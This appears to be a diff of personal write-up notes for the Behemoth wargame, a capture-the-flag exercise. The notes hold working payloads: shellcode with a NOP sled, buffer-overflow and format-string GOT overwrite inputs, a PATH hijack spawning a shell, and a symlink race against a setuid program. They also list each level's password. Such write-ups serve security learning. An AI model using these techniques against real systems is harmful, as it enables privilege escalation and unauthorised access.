@@ -1,17 +1,18 @@
 ############################################ Behemoth #############################################
 
-Level 0:
-Exlpoit: ltrace
+Level:    0
+Exlpoit:  ltrace
+Password: 8YpAQCAuKf
 
 * Using ltrace shows that the program calls strcmp on the user input password and the 
   actual password for the file.
 
-password: 8YpAQCAuKf
 
 ###################################################################################################
 
-Level 1:
-Exploit: Buffer Overflow
+Level:    1
+Exploit:  Buffer Overflow
+Password: IxPJbQtH8q
 
 Stack
 Low
@@ -48,16 +49,17 @@ cyclic -l <address of interest>
 
 * We can create an environment variable with NOP sled and shellcode as shown below
 
-export SHELLCODE=$(perl -e 'print "\x90"x20 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
+export SHELLCODE=$(perl -e 'print "\x90"x20 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01
+\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53
+\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
 
 (perl -e 'print "\x90"x71 . "\xb1\xd5\xff\xff"';cat) | ./behemoth1
 
-password: IxPJbQtH8q
-
 ###################################################################################################
 
-Level 2:
-Exploit: Path Priviledge Escalation
+Level:    2
+Exploit:  Path Priviledge Escalation
+Password: JQ6tZGqt0i
 
 * ltrace shows that permissions are elavated and there is a system() cmd without a 
   full path <touch>
@@ -69,12 +71,11 @@ echo "/bin/bash" > touch
 chmod 777 touch
 export PATH=.:$PATH
 
-password: JQ6tZGqt0i
-
 ###################################################################################################
 
-Level 3:
-Exploit: Format String Vulnerability
+Level:    3
+Exploit:  Format String Vulnerability
+Password: hpjUdlG723
 
 * Overwrite function addr in the GOT (Binary Exploitation)
 
@@ -119,12 +120,11 @@ perl -e 'print "AAAA\x18\xb2\x04\x08AAAA\x19\xb2\x04\x08AAAA\x1a\xb2\x04\x08" . 
 perl -e 'print "AAAA\x18\xb2\x04\x08AAAA\x19\xb2\x04\x08AAAA\x1a\xb2\x04\x08AAAA\x1b\xb2\x04\x08" . "%107x%n%74x%n%42x%n%256x%n"'
   8 + 8 + 8 + 8 + 107 = 139 + 74 = 213 + 42 = 255 + 256 = 0x1ff
 
-password = hpjUdlG723
-
 ###################################################################################################
 
-Level 4
-Exploit: Symbolic Link, Pausing Processes
+Level:    4
+Exploit:  Symbolic Link, Pausing Processes
+Password: mVfC4rBKZ4
 
 * The proc gets its own PID and then attempts to open and read a file /tmp/$PID.
   Because setuid, we can symbolic link /tmp/$PID to behemoth5 password file. 
@@ -133,26 +133,23 @@ Exploit: Symbolic Link, Pausing Processes
 
 /behemoth4& PID=$!; kill -STOP $PID; ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID; kill -CONT $PID
 
-password = mVfC4rBKZ4
-
 ###################################################################################################
 
 Level 5
 Exploit: 
-
 password = j9I1wHzfVC
 
 ###################################################################################################
 
 Level 6
 Exploit:
-
 password = sV17oOQTKc
 
 ###################################################################################################
 
-Level 7
-Exploit: Buffer Overflow
+Level:    7
+Exploit:  Buffer Overflow
+Password: 8yWcelJd0D
 
 strcpy buffer overflow
 ./behemoth7 $(perl -e 'print "A"x528 . "B"x4')
@@ -169,5 +166,4 @@ $(perl -e 'print "A"x528 . "B"x4 . "\x90" x100')
 \xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69
 \x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
 
-password = 8yWcelJd0D
 
